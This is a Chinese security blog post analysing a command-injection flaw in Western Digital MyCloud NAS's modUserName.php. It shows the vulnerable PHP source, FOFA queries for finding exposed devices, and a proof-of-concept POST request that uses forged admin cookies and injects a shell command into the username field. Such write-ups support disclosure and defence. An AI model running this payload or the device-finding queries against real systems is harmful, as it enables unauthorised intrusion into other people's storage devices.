---
title: "西部数码 NAS modUserName.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-modUserName-rce.html
asset_dir: assets/西部数码-nas-modusername.php-命令执行漏洞
---

# 西部数码 NAS modUserName.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/9 12:31
* 882浏览
* [2评论](#comment)
* 20分钟阅读

深入探索

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨

服务器

文件大小转换


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS modUserName.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `modUserName.php` 其业务实现逻辑如下

```
<?
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}
if (isset($_POST['username']) && $_POST['username'] != "")
{
    $username = $_POST['username'];
    $oldName = $_POST['oldName'];
    $ip = $_SERVER['REMOTE_ADDR'];

    if (isset($_SESSION['username']))
    {
       $sname = $_SESSION['username'];
       $debugCmd="echo old:$sname >/tmp/debug";
       exec($debugCmd, $ret);

    unset($_SESSION['username']);
    $_SESSION['username'] = $username;

       $sname = $_SESSION['username'];
       $debugCmd="echo new:$sname >>/tmp/debug";
       exec($debugCmd, $ret);

    session_write_close();

       //echo $_SESSION['username'];
    }
    else
    {
       $debugCmd="echo 'no session' >>/tmp/debug";
       exec($debugCmd, $ret);
    }

    //wto delete 
    $cmd = "wto -n \"$oldName\" -d ";
    system($cmd,$retval);

    //wto add
    $cmd = "wto -n \"$username\" -i \"$ip\" -s";
    system($cmd,$retval);

    header("Status: 200");
}
?>
```

在处理管理员修改用户名的功能时，将用户提交的 `username` 和 `oldName` 参数未经任何过滤或转义，直接拼接到 `system()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管需要管理员权限，但可以结合login\_check的权限绕过达到 [RCE](https://mrxn.net/tag/rce)的效果。

计算机驱动器和存储设备

# 漏洞复现

```
POST /web/php/modUserName.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: username=test; isAdmin=1
Content-Type: application/x-www-form-urlencoded

oldName=someuser&username=newuser"; id; #
```

[![西部数码 NAS modUserName.php 命令执行漏洞](images/img-001-c6c8a6404dee.webp)](https://image.mrxn.net/63b83ed095974f7e8744143940a76b33.webp)

成功[执行id命令](https://mrxn.net/tag/rce)并回显结果

网络存储

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS modUserName.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-modUserName-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-modUserName-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-modUserName-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

数据备份与恢复

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-modUserName-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 